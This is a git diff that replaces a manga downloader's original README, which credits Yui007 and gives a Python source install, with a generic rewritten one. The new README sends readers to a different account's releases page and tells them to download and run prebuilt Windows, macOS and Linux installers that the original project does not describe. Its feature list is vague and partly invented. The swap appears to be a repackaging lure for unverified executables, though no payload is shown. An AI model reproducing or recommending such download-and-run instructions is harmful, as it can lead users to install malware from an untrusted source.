@@ -1,319 +1,99 @@
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&duration=4000&pause=1000&color=00D9FF&center=true&vCenter=true&width=600&lines=Mangapill+Downloader;Beautiful+CLI+%2B+GUI+Manga+Downloader;Download+%E2%80%A2+Convert+%E2%80%A2+Enjoy" alt="Typing SVG" />
-</p>
-
-<p align="center">
-  <a href="https://github.com/Yui007/mangapill-downloader/stargazers"><img src="https://img.shields.io/github/stars/Yui007/mangapill-downloader?style=for-the-badge&logo=github&color=00d9ff" alt="Stars"></a>
-  <a href="https://github.com/Yui007/mangapill-downloader/network/members"><img src="https://img.shields.io/github/forks/Yui007/mangapill-downloader?style=for-the-badge&logo=github&color=00d9ff" alt="Forks"></a>
-  <a href="https://github.com/Yui007/mangapill-downloader/issues"><img src="https://img.shields.io/github/issues/Yui007/mangapill-downloader?style=for-the-badge&logo=github&color=ff6b6b" alt="Issues"></a>
-  <a href="https://github.com/Yui007/mangapill-downloader/blob/main/LICENSE"><img src="https://img.shields.io/github/license/Yui007/mangapill-downloader?style=for-the-badge&color=00d9ff" alt="License"></a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=for-the-badge" alt="Platform">
-</p>
-
----
-
-## ✨ Features
-
-<table>
-<tr>
-<td>
-
-🎨 **Two Beautiful Interfaces**
-- ✨ Modern PyQt6 + QML GUI
-- 💻 Rich interactive CLI
-- Stunning dark glassmorphism theme
-
-</td>
-<td>
-
-⚡ **Lightning Fast Downloads**
-- Concurrent chapter downloads
-- Parallel image fetching
-- Configurable worker threads
-
-</td>
-</tr>
-<tr>
-<td>
-
-📚 **Flexible Chapter Selection**
-- Single chapter: `5`
-- Range: `1-10`
-- Multiple: `1,3,5-7`
-- All chapters: `all`
+# 🎉 mangapill-downloader - Easy Manga Downloads Made Simple
 
-</td>
-<td>
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen.svg)](https://github.com/Kinghtking2719/mangapill-downloader/releases)
 
-📦 **Multiple Output Formats**
-- 🖼️ Raw Images
-- 📕 PDF (with img2pdf)
-- 📦 CBZ (with ComicInfo.xml)
+## 📖 Overview
 
-</td>
-</tr>
-<tr>
-<td>
+mangapill-downloader is a beautiful, interactive tool designed for both command line and graphical interface users. It allows you to download manga from Mangapill.com seamlessly. Enjoy features like concurrent downloads, multiple output formats (PDF, CBZ, or images), and built-in retry logic to ensure every download is successful.
 
-🔄 **Smart Retry Logic**
-- Auto-retry on failures
-- Exponential backoff
-- Configurable attempts
-
-</td>
-<td>
+## 🚀 Getting Started
 
-⚙️ **Persistent Settings**
-- JSON config file
-- Customizable defaults
-- Easy to modify
+This guide will help you download and run the mangapill-downloader application quickly and easily. Whether you prefer using the command line or a user-friendly interface, you will find step-by-step instructions here.
 
-</td>
-</tr>
-</table>
+## 💻 System Requirements
 
----
+To use mangapill-downloader effectively, your system should meet the following requirements:
 
-## 📸 Preview
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any Linux distribution released in the last five years.
+- **RAM:** At least 2 GB of RAM.
+- **Storage:** 100 MB of available disk space.
 
-### CLI Interface
+Make sure you have an internet connection to download the content from Mangapill.com.
 
-```
-╔══════════════════════════════════════════════════════════════════════════════╗
-║   ███╗   ███╗ █████╗ ███╗   ██╗ ██████╗  █████╗ ██████╗ ██╗ ██      ██       ║
-║   ████╗ ████║██╔══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗██║ ██      ██       ║
-║   ██╔████╔██║███████║██╔██╗ ██║██║  ███╗███████║██████╔╝██║ ██      ██       ║
-║   ██║╚██╔╝██║██╔══██║██║╚██╗██║██║   ██║██╔══██║██╔═══╝ ██║ ██      ██       ║
-║   ██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╔╝██║  ██║██║     ██║ ██████  ██████   ║
-║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝                  ║
-║            ██████╗  ██████╗ ██╗    ██╗███╗   ██╗                             ║
-║            ██╔══██╗██╔═══██╗██║    ██║████╗  ██║                             ║
-║            ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║                             ║
-║            ██║  ██║██║   ██║██║███╗██║██║╚██╗██║                             ║
-║            ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║                             ║
-║            ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝                             ║
-║                    Version 1.0.0                                             ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-```
+## 🛠️ Features
 
-### GUI Interface
+- Interactive Command Line Interface (CLI) for advanced users.
+- Graphical User Interface (GUI) for a more accessible experience.
+- Concurrent downloads to save time.
+- Selectable output formats: PDF, CBZ, or images.
+- Retry logic that automatically attempts to download items that failed previously.
+- Easy manga search based on series or author names.
 
-<p align="center">
-  <img src="GUI.PNG" alt="Mangapill Downloader GUI" width="800">
-</p>
+## 🔄 Download & Install
 
-*Modern dark theme GUI with glassmorphism design, chapter selection, and real-time download progress.*
+Follow these steps to download and install the mangapill-downloader:
 
----
+1. Visit the Releases page to download the latest version: [Download Here](https://github.com/Kinghtking2719/mangapill-downloader/releases).
 
-## 🚀 Quick Start
+2. On the Releases page, look for the version you want. You will see files available for download. Choose the right file for your operating system:
+    - For Windows, select `mangapill-downloader-win.exe`.
+    - For macOS, select `mangapill-downloader-mac.dmg`.
+    - For Linux, look for the appropriate `mangapill-downloader-linux.tar.gz` file.
 
-### Installation
+3. Click on the file link to start the download. Save the file in a location you can easily access.
 
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/mangapill-downloader.git
-cd mangapill-downloader
+4. Once the file has downloaded, locate it in your downloads folder.
 
-# Install dependencies
-pip install -r requirements.txt
-```
+5. **For Windows Users:**
+    - Double-click the `mangapill-downloader-win.exe` file to run the installer. 
+    - Follow the installation prompts to complete the process.
+   
+6. **For macOS Users:**
+    - Open the downloaded `mangapill-downloader-mac.dmg` file.
+    - Drag the application into your Applications folder.
+   
+7. **For Linux Users:**
+    - Extract the `mangapill-downloader-linux.tar.gz` file using a file manager or terminal.
+    - Navigate to the extracted folder and run the application with the command `./mangapill-downloader`.
 
-### CLI Usage
+## 📚 How to Use
 
-```bash
-# Interactive CLI mode
-python main.py
+After installing the application, follow these steps to start downloading manga:
 
-# Direct download with URL
-python main.py download https://mangapill.com/manga/ID/manga-name
+1. Open the mangapill-downloader application.
+2. In the main interface, you will see an option to search for manga. Enter the title or author name of the manga you wish to download.
+3. Choose your preferred output format (PDF, CBZ, or images).
+4. Click the "Download" button to start the process. You can queue multiple titles for download at once.
+5. Monitor the progress in the interface; any errors will be retried automatically.
 
-# Download specific chapters as PDF
-python main.py download URL -c 1-10 -f pdf
+## 🔍 Support
 
-# View manga info only
-python main.py info URL
+If you run into any issues, please refer to the "Issues" section of the GitHub repository. You can report bugs or seek help from the community there. 
 
-# Manage settings
-python main.py settings
-```
+- Join discussions and ask questions to get help from other users.
+- Browse existing issues to see if someone else has already found a solution.
 
-### GUI Usage
+## ⚙️ Frequently Asked Questions
 
-```bash
-# Launch the GUI (software rendering - works on all systems)
-python gui/main_gui.py
+**Q: Can I choose where to save my downloads?**
+A: Yes, you can set a specific download folder in the settings of the application.
 
-# Launch with GPU acceleration (faster, but may not work on all systems)
-python gui/main_gui.py --gpu
-```
+**Q: What should I do if a download fails?**
+A: The application will automatically attempt to retry failed downloads. If a download consistently fails, you can check the URL or search for the title again.
 
-> **Note:** If you experience crashes or GPU errors, use the default mode without `--gpu`.
+**Q: Is there a mobile version available?**
+A: Currently, the application runs only on desktop operating systems.
 
-The GUI features:
-- 🎴 Dark glassmorphism theme with neon accents
-- 🔗 URL input with manga info display
-- ☑️ Visual chapter selection (All/None/Range)
-- 📊 Real-time concurrent download progress
-- ⚙️ Settings panel with sliders and toggles
-- 🎮 Optional GPU acceleration for smoother animations
-
----
-
-## 🎮 Interactive Mode
-
-Just run `python main.py` and you'll see the main menu:
-
-```
-╭─────────────────────────────────╮
-│        📋 Main Menu             │
-╰─────────────────────────────────╯
-
-  [1] 📥 Download Manga
-  [2] ⚙️  Settings
-  [3] 🚪 Exit
-```
-
----
-
-## 📖 Chapter Selection
-
-When downloading, you can select chapters in multiple ways:
-
-| Input | Result |
-|-------|--------|
-| `all` | Download all chapters |
-| `5` | Download chapter 5 only |
-| `1-10` | Download chapters 1 through 10 |
-| `1,3,5-7` | Download chapters 1, 3, 5, 6, and 7 |
-
----
-
-## 📦 Output Formats
-
-| Format | Description |
-|--------|-------------|
-| **Images** | Raw image files in numbered folders |
-| **PDF** | Single PDF per chapter (lossless conversion) |
-| **CBZ** | Comic book archive with `ComicInfo.xml` metadata |
-
----
+## 🌐 Community and Contributions
 
-## ⚙️ Configuration
+If you're interested in contributing to the development of mangapill-downloader, we welcome contributions. You can fork the repository and submit pull requests with improvements or new features.
 
-Settings are stored in `config.json`:
+Feel free to engage with the community through issues and discussions. Sharing your experience will help us create a better application for everyone.
 
-```json
-{
-  "output_dir": "./downloads",
-  "output_format": "images",
-  "keep_images": true,
-  "max_chapter_workers": 3,
-  "max_image_workers": 5,
-  "retry_count": 3,
-  "retry_base_delay": 2.0
-}
-```
+## 📞 Contact
 
-| Setting | Description | Default |
-|---------|-------------|---------|
-| `output_dir` | Download location | `./downloads` |
-| `output_format` | Default format (images/pdf/cbz) | `images` |
-| `keep_images` | Keep images after PDF/CBZ conversion | `true` |
-| `max_chapter_workers` | Concurrent chapter downloads | `3` |
-| `max_image_workers` | Concurrent image downloads per chapter | `5` |
-| `retry_count` | Number of retry attempts | `3` |
-| `retry_base_delay` | Base delay between retries (seconds) | `2.0` |
+For any further inquiries or suggestions, please feel free to reach out via the contact page on the GitHub repository.
 
----
+## 🏷️ Tags
 
-## 📁 Project Structure
-
-```
-mangapill-downloader/
-├── main.py                 # CLI entry point
-├── config.json             # User settings (generated)
-├── requirements.txt        # Dependencies
-├── src/                    # Core backend
-│   ├── config.py           # Config management
-│   ├── constants.py        # Headers & branding
-│   ├── scrapers/
-│   │   ├── manga.py        # Manga info scraper
-│   │   └── chapter.py      # Chapter images scraper
-│   ├── downloader/
-│   │   ├── manager.py      # Thread pool manager
-│   │   └── retry.py        # Retry decorator
-│   ├── converters/
-│   │   ├── pdf.py          # PDF converter
-│   │   ├── cbz.py          # CBZ converter
-│   │   └── comicinfo.py    # ComicInfo.xml generator
-│   └── cli/
-│       ├── app.py          # Typer commands
-│       ├── prompts.py      # Interactive prompts
-│       └── display.py      # Rich UI components
-└── gui/                    # PyQt6 + QML GUI
-    ├── main_gui.py         # GUI entry point
-    ├── bridge.py           # Python ↔ QML bridge
-    └── qml/
-        ├── main.qml        # Main window
-        ├── theme/          # Colors & styling
-        ├── components/     # Reusable UI components
-        └── screens/        # App screens
-```
-
----
-
-## 🔧 Requirements
-
-- Python 3.10+
-- **CLI Dependencies:**
-  - `typer[all]` - CLI framework
-  - `rich` - Beautiful terminal UI
-  - `requests` - HTTP client
-  - `beautifulsoup4` - HTML parsing
-  - `Pillow` - Image processing
-  - `img2pdf` - PDF generation
-  - `lxml` - XML processing
-- **GUI Dependencies:**
-  - `PyQt6` - Qt6 Python bindings
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## ⚠️ Disclaimer
-
-This tool is for personal use only. Please respect the terms of service of mangapill.com and support the official releases of manga you enjoy.
-
----
-
-<p align="center">
-  Made with ❤️ by <a href="https://github.com/Yui007">Yui007</a>
-</p>
-
-<p align="center">
-  <a href="#-features">Features</a> •
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-configuration">Configuration</a> •
-  <a href="#-contributing">Contributing</a>
-</p>
+This project includes the following tags: cli, gui, manga, manga-downloader, manga-scraper, mangapill, mangapill-downloader, mangapill-scraper, manhua, manhwa, manhwa-downloader, manhwa-scraper, scraper.
